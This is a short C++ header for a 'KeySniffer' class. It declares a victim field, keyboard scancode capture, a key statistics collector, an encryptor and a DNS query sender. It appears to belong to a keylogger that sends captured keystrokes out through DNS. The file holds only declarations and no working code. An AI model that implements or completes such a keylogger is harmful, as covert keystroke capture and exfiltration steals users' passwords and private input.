#ifndef KSNIFFER_H
#define KSNIFFER_H

#include "common/common.hpp"
#include "common/cryptographer.hpp"
#include "key_stat_collector.hpp"
#include "dns_sender.hpp"

class KeySniffer
{
    static KeySniffer ksniffer;

    bool sniffing_;
    int victim_;
    KeyStatCollector collector_;
    DnsQuerySender sender_;
    Cryptographer cryptographer_;

public:
    static KeySniffer *Instance();

    KeySniffer();

    void Sniff(int scancode);
    void AnalyzePacket(const char *buf, size_t size);
};

#endif //KSNIFFER_H
